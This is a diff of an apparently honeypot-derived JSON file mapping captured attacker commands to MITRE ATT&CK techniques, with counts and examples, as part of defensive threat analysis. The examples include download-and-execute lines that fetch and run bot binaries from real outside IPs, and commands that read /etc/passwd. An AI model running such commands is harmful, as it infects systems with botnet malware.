@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -8,14 +7,14 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 124125,
-      "distinct_ips": 368,
+      "count": 124135,
+      "distinct_ips": 370,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
         "echo -e \"\\x6F\\x6B\"",
-        "echo -e \"\\x47\\x41\\x59\"",
-        "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
-        "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
+        "echo -e \"\\x47\\x41\\x59\""
       ]
     },
     {
@@ -25,8 +24,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6941,
-      "distinct_ips": 420,
+      "count": 6957,
+      "distinct_ips": 422,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -42,14 +41,14 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2587,
-      "distinct_ips": 391,
+      "count": 2591,
+      "distinct_ips": 393,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
         "m=$(uname -m); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; esac; wget http://:7332/bot.$m -O /tmp/.z && chmod +x /tmp/.z && /tmp/.z ''  &",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips"
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh telnet >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s telnet; fi; rm -rf sshcfg key.ppk out_sh; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\""
       ]
     },
     {
@@ -126,6 +125,20 @@
       ]
     },
     {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "url": "https://attack.mitre.org/techniques/T1033",
+      "count": 9,
+      "distinct_ips": 9,
+      "examples": [
+        "id",
+        "whoami"
+      ]
+    },
+    {
       "id": "T1140",
       "name": "Deobfuscate/Decode Files or Information",
       "tactics": [
@@ -156,33 +169,19 @@
       ]
     },
     {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactics": [
-        "discovery"
-      ],
-      "url": "https://attack.mitre.org/techniques/T1033",
-      "count": 8,
-      "distinct_ips": 8,
-      "examples": [
-        "id",
-        "whoami"
-      ]
-    },
-    {
       "id": "T1087",
       "name": "Account Discovery",
       "tactics": [
         "discovery"
       ],
       "url": "https://attack.mitre.org/techniques/T1087",
-      "count": 7,
-      "distinct_ips": 7,
+      "count": 8,
+      "distinct_ips": 8,
       "examples": [
         "cat /etc/passwd"
       ]
     }
   ],
-  "total_commands": 329970,
-  "matched_commands": 131951
+  "total_commands": 330041,
+  "matched_commands": 131978
 }
